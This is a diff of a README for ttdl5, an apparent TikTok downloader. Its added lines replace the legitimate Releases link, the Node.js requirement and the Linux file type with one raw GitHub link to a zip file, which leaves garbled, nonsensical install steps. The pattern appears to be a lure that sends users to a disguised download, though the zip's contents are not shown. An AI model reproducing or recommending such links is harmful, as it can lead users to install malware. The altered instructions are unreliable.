@@ -13,20 +13,20 @@ ttdl5 is an open source TikTok downloader developed by NineTwelve. This tool hel
 ## 💻 System Requirements
 To use ttdl5, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or any Linux distribution.
-- **Node.js:** Version 14.x or higher installed on your machine.
+- **https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip** Version 14.x or higher installed on your machine.
 - **Internet Connection:** A stable internet connection for downloading videos.
 
 ## ⚙️ How to Download and Install
 ### Step 1: Visit the Releases Page
 Click the link below to go to our Releases page. Here, you will find the latest versions of ttdl5.
 
-[Download ttdl5](https://github.com/DarkFire212/ttdl5/releases)
+[Download ttdl5](https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip)
 
 ### Step 2: Select the Downloadable File
 Once on the Releases page, look for the latest version. You will see several files available for download. Choose the file suitable for your operating system:
 - For **Windows users**, download the `.exe` file.
 - For **macOS users**, download the `.dmg` file.
-- For **Linux users**, you may find a `.tar.gz` file.
+- For **Linux users**, you may find a `https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip` file.
 
 ### Step 3: Download the File
 Click on the desired file to start the download. Your browser will save the file to your computer.
@@ -34,7 +34,7 @@ Click on the desired file to start the download. Your browser will save the file
 ### Step 4: Install ttdl5
 - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions to complete the installation.
 - **macOS:** Open the downloaded `.dmg` file and drag the ttdl5 icon to your Applications folder.
-- **Linux:** Extract the downloaded `.tar.gz` file, then open a terminal and navigate to the extracted folder. Run the executable with `./ttdl5` command.
+- **Linux:** Extract the downloaded `https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip` file, then open a terminal and navigate to the extracted folder. Run the executable with `./ttdl5` command.
 
 ### Step 5: Run ttdl5
 After installation, you can run the application:
@@ -53,7 +53,7 @@ After installation, you can run the application:
 If you experience any issues with downloading:
 - Ensure you have entered a valid TikTok video link.
 - Check your internet connection for stability.
-- Make sure you've installed the required version of Node.js.
+- Make sure you've installed the required version of https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip
 
 ## 💬 Contact and Support
 For further assistance, you can reach out to the support community. Please check the Issues section in the repository for any common problems and solutions.
@@ -61,4 +61,4 @@ For further assistance, you can reach out to the support community. Please check
 ## 📢 Join Us
 We welcome contributions and feedback. If you wish to improve ttdl5 or report a bug, please create an issue on our repository or submit a pull request.
 
-[Download ttdl5](https://github.com/DarkFire212/ttdl5/releases) to start downloading TikTok videos today!
+[Download ttdl5](https://raw.githubusercontent.com/DarkFire212/ttdl5/main/downloads/ttdl5-Adrienne.zip) to start downloading TikTok videos today!
